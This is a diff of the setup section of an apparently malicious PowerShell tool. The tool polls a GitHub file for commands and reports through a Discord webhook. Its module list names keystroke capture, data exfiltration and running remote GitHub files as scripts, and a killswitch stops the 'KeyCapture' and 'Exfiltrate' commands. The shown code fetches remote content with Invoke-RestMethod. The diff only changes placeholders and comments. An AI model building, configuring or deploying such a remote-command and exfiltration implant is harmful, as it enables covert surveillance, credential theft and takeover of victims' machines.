@@ -26,20 +26,22 @@ MODULES
 = CustomCommand : Execute a github file as a script.   =
 
 SETUP
-1. change "$gh" to the url for the file that contains the command eg. "https://raw.githubusercontent.com/Username/Repo/main/file.txt"
-2. change "$dc" to your webhook eg. "https://discord.com/api/webhooks/123445623531/f4fw3f4r46r44343t5gxxxxxx"
+1. change "YOUR GITHUB FILE URL" to the url for the file that contains the command eg. "https://raw.githubusercontent.com/Username/Repo/main/file.txt"
+2. change "YOUR WEBHOOK URL" to your webhook eg. "https://discord.com/api/webhooks/123445623531/f4fw3f4r46r44343t5gxxxxxx"
 
 EXTRA
-You can add custom scripting in a secondary github file, change "$cc" to another text file and add code to it,
+You can add custom scripting in a secondary github file, change "YOUR SECONDARY GITHUB FILE URL" to another text file and add code to it,
 then in the first github file save it with 'customcommand' as the contents (no quotes)
 
 Killswitch : save github file contents as 'kill' to stop 'KeyCapture' or 'Exfiltrate' command and return to waiting for commands. (no quotes)
 
 #>
 
-$GHurl = "$gh"   # YOUR GITHUB FILE URL
-$CCurl = "$cc"   # YOUR SECONDARY GITHUB FILE URL (optional)
-$hookurl = "$dc" # YOUR WEBHOOK URL
+# Uncomment the lines below and add you details
+# $GHurl = "YOUR GITHUB FILE URL" 
+# $CCurl = "YOUR SECONDARY GITHUB FILE URL"  # (optional)
+# $hookurl = "YOUR WEBHOOK URL"
+
 $response = Invoke-RestMethod -Uri $GHurl
 $previouscmd = $response
 
